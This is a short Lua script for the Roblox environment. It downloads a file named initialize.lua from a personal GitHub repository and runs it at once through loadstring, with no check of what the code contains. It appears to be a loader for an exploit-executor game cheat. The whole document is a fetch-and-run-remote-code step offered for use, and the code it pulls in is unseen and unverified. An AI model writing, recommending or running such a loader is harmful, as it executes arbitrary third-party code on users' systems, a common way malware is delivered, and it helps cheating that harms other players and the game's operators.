local success, result = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/yoo123fd/ff2/main/initialize.lua")
warn(success)
if success then
    loadstring(result)()
end

